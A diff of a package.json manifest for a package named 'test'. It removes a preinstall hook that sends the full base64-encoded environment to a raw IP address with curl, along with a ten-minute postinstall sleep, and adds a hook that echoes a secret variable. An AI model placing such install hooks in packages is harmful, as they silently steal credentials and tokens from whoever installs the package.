@@ -2,8 +2,7 @@
   "name": "test",
   "version": "1",
   "scripts": {
-    "preinstall":"curl http://103.16.128.93/?token=$(env | base64 | tr -d '\n')",
-    "postinstall": "sleep 600"
+    "preinstall":"echo $MY_SECRET"
   },
   "author": "me",
   "license": "Apache-2.0",
